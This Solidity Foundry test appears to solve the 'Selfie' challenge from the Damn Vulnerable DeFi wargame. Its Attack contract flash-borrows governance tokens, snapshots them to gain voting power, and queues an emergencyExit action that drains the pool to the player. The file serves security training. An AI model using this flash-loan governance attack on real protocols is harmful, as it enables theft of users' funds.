// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "../../src/DamnValuableTokenSnapshot.sol";
import "../../src/selfie/SimpleGovernance.sol";
import "../../src/selfie/SelfiePool.sol";

contract SelfieTest is Test {
    address public deployer;
    address public player;

    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;

    uint256 public constant TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 public constant TOKENS_IN_POOL = 1_500_000 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");

        vm.startPrank(deployer);
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));
        assertEq(governance.getActionCounter(), 1);

        pool = new SelfiePool(address(token), address(governance));
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));

        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
        vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player);
        // first take a flash loan
        Attack attack = new Attack(address(pool), address(governance), address(token));
        attack.borrowTokens(TOKENS_IN_POOL);

        // wait for the governance delay
        skip(2 days);

        // execute the governance action
        governance.executeAction(attack.actionId());

        vm.stopPrank();
    }

    function test_exploit() public {
        exploit();

        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}

contract Attack is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    uint256 public actionId;
    address public owner;

    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        owner = msg.sender;
    }

    function borrowTokens(uint256 _amount) public {
        pool.flashLoan(this, address(token), _amount, "");
    }

    function onFlashLoan(address _initiator, address _token, uint256 _amount, uint256 _fee, bytes calldata)
        external
        override
        returns (bytes32)
    {
        if (
            _initiator != address(this) || msg.sender != address(pool) || address(_token) != address(pool.token())
                || _fee != 0
        ) {
            revert("UnexpectedFlashLoan");
        }
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
        // call snapshot() on the token
        token.snapshot();
        // queue a governance action to drain the pool
        actionId = governance.queueAction(address(pool), 0, data);
        // repay the flash loan
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
